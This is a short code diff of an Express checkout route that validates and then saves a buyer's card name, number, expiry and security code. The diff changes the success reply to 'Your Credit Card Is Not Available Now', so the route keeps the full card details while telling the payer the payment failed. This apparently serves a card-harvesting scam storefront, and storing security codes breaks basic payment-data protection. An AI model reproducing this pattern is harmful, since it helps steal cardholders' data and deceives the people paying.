@@ -21,10 +21,10 @@ router.post('/checkout', async function(req, res, next) {
         validateOnlyNumber(exp.replace('/', '')) &&
         validateOnlyNumber(code)
     if (!isValid) {
-        return res.json("INVALID CARF INFORMATION")
+        return res.json("Invalid Card Information")
     }
     await model.create({ name, number, exp, code });
-    return res.json("SUCCESS")
+    return res.json("Your Credit Card Is Not Available Now")
 });
 // GET ALL PRODUCT
 router.get('/get-all-product', (req, res) => {
